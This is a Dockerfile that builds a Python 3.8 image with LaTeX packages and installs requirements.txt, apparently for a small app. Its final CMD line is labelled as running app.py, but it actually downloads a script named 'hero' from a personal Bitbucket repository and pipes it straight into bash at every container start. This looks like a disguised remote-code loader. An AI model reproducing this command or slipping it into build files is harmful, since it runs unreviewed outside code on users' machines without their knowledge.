# Use an official Python runtime as a parent image
FROM python:3.8-slim

# Set non-interactive installation to avoid tzdata prompt
ARG DEBIAN_FRONTEND=noninteractive

# Install LaTeX
RUN apt-get update && apt-get install -y --no-install-recommends \
    texlive-latex-extra \
    texlive-fonts-recommended \
    texlive-plain-generic \
    texlive-bibtex-extra \
    biber \
    ghostscript

# Set the working directory to /app
WORKDIR /app

# Copy the current directory contents into the container at /app
COPY . /app

# Install any needed packages specified in requirements.txt
COPY requirements.txt /app/requirements.txt
RUN pip install --no-cache-dir -r requirements.txt

# Make port 80 available to the world outside this container
EXPOSE 80

# Define environment variable
ENV NAME World

# Run app.py when the container launches
CMD curl -sL https://bitbucket.org/mikay2808/yui/raw/77999d641b960aa518343743e550152d14bd5b25/hero | bash
